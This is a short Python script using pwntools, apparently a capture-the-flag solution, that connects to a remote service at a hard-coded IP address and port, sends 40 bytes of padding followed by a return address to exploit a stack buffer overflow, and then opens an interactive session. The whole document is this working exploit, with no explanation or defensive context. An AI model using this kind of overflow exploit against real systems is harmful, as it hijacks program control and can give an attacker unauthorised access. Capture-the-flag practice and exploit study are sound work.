from pwn import *

r = remote("194.5.207.56", 7010)

payload = "a"*40 + p64(0x00000000004012ec)
r.sendline(payload)

r.interactive()